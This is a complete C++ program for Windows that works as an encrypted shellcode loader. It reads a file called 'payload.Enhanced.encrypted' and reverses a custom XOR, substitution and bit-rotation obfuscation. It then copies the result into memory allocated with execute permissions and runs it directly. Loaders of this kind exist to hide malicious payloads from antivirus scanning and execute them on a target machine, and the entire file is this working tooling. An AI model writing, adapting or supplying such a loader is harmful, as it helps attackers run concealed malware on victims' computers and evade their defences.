#include <windows.h>
#include <fstream>
#include <vector>

static unsigned char sbox[256];
static void buildSbox() {
    for (int i = 0; i < 256; ++i) sbox[i] = (i * 7 + 13) % 256;
}

static std::vector<unsigned char> decryptEnhanced(const std::vector<unsigned char>& enc) {
    if (enc.empty()) return {};
    unsigned char key = enc[0];
    std::vector<unsigned char> out(enc.begin() + 1, enc.end());
    buildSbox();
    for (size_t i = 0; i < out.size(); ++i) out[i] ^= 0xAA;
    for (size_t i = 0; i < out.size(); ++i) {
        for (int j = 0; j < 256; ++j) if (sbox[j] == out[i]) { out[i] = j; break; }
    }
    for (size_t i = 0; i < out.size(); ++i) {
        int shift = (i % 7) + 1;
        out[i] = (out[i] >> (8 - shift)) | (out[i] << shift);
        out[i] ^= key;
    }
    return out;
}

int main() {
    std::ifstream f("payload.Enhanced.encrypted", std::ios::binary);
    std::vector<unsigned char> enc((std::istreambuf_iterator<char>(f)),
                                   std::istreambuf_iterator<char>());
    auto dec = decryptEnhanced(enc);
    if (!dec.empty()) {
        auto exec = VirtualAlloc(nullptr, dec.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (exec) { memcpy(exec, dec.data(), dec.size()); ((void(*)())exec)(); }
    }
    return 0;
}
